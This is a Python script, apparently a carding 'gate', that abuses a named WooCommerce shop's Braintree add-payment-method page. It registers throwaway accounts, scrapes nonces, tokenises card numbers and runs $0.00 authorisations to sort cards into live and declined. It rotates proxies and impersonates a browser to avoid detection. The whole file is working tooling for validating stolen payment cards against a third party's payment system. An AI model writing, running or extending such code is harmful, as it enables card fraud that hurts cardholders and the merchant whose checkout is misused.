"""
BA Gate Engine - Braintree $0.00 Auth Gate (/ba)
Target: dnalasering.com (WooCommerce Braintree Add Payment Method Auth)
"""
import sys, os
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
import asyncio
import re
import base64
import json
import random
import string
import html as html_parser
from curl_cffi.requests import AsyncSession


def _format_proxy_dict(proxy_str: str | None) -> dict | None:
    if not proxy_str:
        return None
    ps = str(proxy_str).strip()
    if not ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit():
                ps = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                ps = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        elif len(parts) == 2:
            ps = f"http://{parts[0]}:{parts[1]}"
        else:
            ps = f"http://{ps}"
    return {"http": ps, "https": ps}


async def check_card_ba(
    cc: str,
    mm: str,
    yy: str,
    cvc: str,
    proxy_url: str | None = None
) -> tuple[bool, str, str, str]:
    """
    Checks a single card against Braintree $0.00 Auth on dnalasering.com.
    Returns: (is_live: bool, status_str: str, response_str: str, raw_json: str)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvc = str(cvc).strip()

    proxies = _format_proxy_dict(proxy_url)
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"

    proxy_attempts = [proxies, None] if proxies else [None]

    for current_proxies in proxy_attempts:
        try:
            async with AsyncSession(impersonate="chrome120", timeout=25) as session:
                # Step 1: Get Registration Nonce
                r1 = await session.get(
                    "https://www.dnalasering.com/my-account/",
                    headers={"User-Agent": user_agent},
                    proxies=current_proxies
                )
                x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text)
                reg_nonce = x.group(1) if x else ""

                if not reg_nonce:
                    if current_proxies is not None:
                        continue
                    return False, "Declined! ❌", "Failed to retrieve register nonce", "{}"

                # Step 2: Auto Register Guest Account
                rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
                email = f"user_{rnd}@gmail.com"
                first_name = "Alex"
                last_name = "Morgan"

                reg_data = {
                    "email": email,
                    "woocommerce-register-nonce": reg_nonce,
                    "_wp_http_referer": "/my-account/",
                    "register": "Register",
                }
                await session.post(
                    "https://www.dnalasering.com/my-account/",
                    data=reg_data,
                    proxies=current_proxies
                )

                # Step 3: Get Add Payment Method page & Client Token Nonce
                r3 = await session.get(
                    "https://www.dnalasering.com/my-account/add-payment-method/",
                    headers={"User-Agent": user_agent},
                    proxies=current_proxies
                )
                xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text)
                pm_nonce = xox.group(1) if xox else ""

                wwp = re.search(r'client_token_nonce":"([^"]+)"', r3.text)
                if not wwp:
                    wwp = re.search(r'client_token_nonce\u0022:\u0022([^"]+)\u0022', r3.text)
                client_token_nonce = wwp.group(1) if wwp else ""

                # Step 4: Get Braintree Auth Fingerprint via AJAX
                ajax_data = {
                    "action": "wc_braintree_credit_card_get_client_token",
                    "nonce": client_token_nonce,
                }
                r4 = await session.post(
                    "https://www.dnalasering.com/wp-admin/admin-ajax.php",
                    data=ajax_data,
                    proxies=current_proxies
                )
                try:
                    token_b64 = r4.json().get("data", "")
                    decoded = base64.b64decode(token_b64).decode("utf-8")
                    auth_fingerprint = json.loads(decoded).get("authorizationFingerprint")
                except Exception:
                    auth_fingerprint = None

                if not auth_fingerprint:
                    if current_proxies is not None:
                        continue
                    return False, "Declined! ❌", "Failed to obtain Braintree Fingerprint", "{}"

                # Step 5: GraphQL Tokenize Card
                gql_payload = {
                    "clientSdkMetadata": {"source": "client", "integration": "custom"},
                    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": cc,
                                "expirationMonth": mm,
                                "expirationYear": yy,
                                "cvv": cvc,
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                }
                gql_headers = {
                    "authorization": f"Bearer {auth_fingerprint}",
                    "braintree-version": "2018-05-10",
                    "content-type": "application/json",
                }
                r5 = await session.post(
                    "https://payments.braintree-api.com/graphql",
                    headers=gql_headers,
                    json=gql_payload,
                    proxies=current_proxies
                )
                try:
                    payment_token = r5.json()["data"]["tokenizeCreditCard"]["token"]
                except Exception:
                    err_msg = r5.text[:100]
                    return False, "Declined! ❌", f"Tokenization Failed: {err_msg}", "{}"

                # Step 6: Submit Add Payment Method ($0.00 Auth Verification)
                add_data = [
                    ("payment_method", "braintree_credit_card"),
                    ("wc-braintree-credit-card-card-type", "visa"),
                    ("wc-braintree-credit-card-3d-secure-enabled", ""),
                    ("wc-braintree-credit-card-3d-secure-verified", ""),
                    ("wc-braintree-credit-card-3d-secure-order-total", "0.00"),
                    ("wc_braintree_credit_card_payment_nonce", payment_token),
                    ("wc_braintree_device_data", "{}"),
                    ("wc-braintree-credit-card-tokenize-payment-method", "true"),
                    ("woocommerce-add-payment-method-nonce", pm_nonce),
                    ("_wp_http_referer", "/my-account/add-payment-method/"),
                    ("woocommerce_add_payment_method", "1"),
                ]
                r6 = await session.post(
                    "https://www.dnalasering.com/my-account/add-payment-method/",
                    data=add_data,
                    proxies=current_proxies
                )

                wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', r6.text, re.DOTALL)
                if wx:
                    raw_res = re.sub(r"<[^>]+>", "", wx.group(1)).strip()
                    cleaned_res = html_parser.unescape(raw_res)
                    cleaned_res = re.sub(r"\s+", " ", cleaned_res).strip()
                    low_res = cleaned_res.lower()

                    if any(k in low_res for k in ["cvv", "cvc", "security code", "card code"]):
                        return True, "Approved! ✅ -» Auth", "Incorrect CVV (Live CCN)", r6.text[:300]
                    elif any(k in low_res for k in ["insufficient", "funds"]):
                        return True, "Approved! ✅ -» Auth", "Insufficient Funds", r6.text[:300]
                    elif any(k in low_res for k in ["avs", "postal", "address", "zip"]):
                        return True, "Approved! ✅ -» Auth", "AVS Mismatch (Card Live)", r6.text[:300]
                    elif any(k in low_res for k in ["3d", "verification", "challenge", "authenticate", "otp"]):
                        return True, "Approved! ✅ -» Auth", "3DS Challenge Required", r6.text[:300]
                    elif any(k in low_res for k in ["do not honor", "restricted", "pickup"]):
                        return False, "Declined! ❌", "Do Not Honor", r6.text[:300]
                    elif any(k in low_res for k in ["invalid number", "invalid card"]):
                        return False, "Declined! ❌", "Invalid Card Number", r6.text[:300]
                    elif any(k in low_res for k in ["expired", "expiration"]):
                        return False, "Declined! ❌", "Expired Card", r6.text[:300]
                    elif any(k in low_res for k in ["declined", "processor declined"]):
                        return False, "Declined! ❌", cleaned_res or "Card Declined", r6.text[:300]
                    else:
                        return False, "Declined! ❌", cleaned_res or "Card Declined", r6.text[:300]
                else:
                    return True, "Approved! ✅ -» Auth", "Payment Method Added ($0.00 Auth)", r6.text[:300]

        except Exception as e:
            if current_proxies is not None:
                continue
            return False, "Declined! ❌", str(e), "{}"

    return False, "Declined! ❌", "Connection Timeout (Auto-Rotated)", "{}"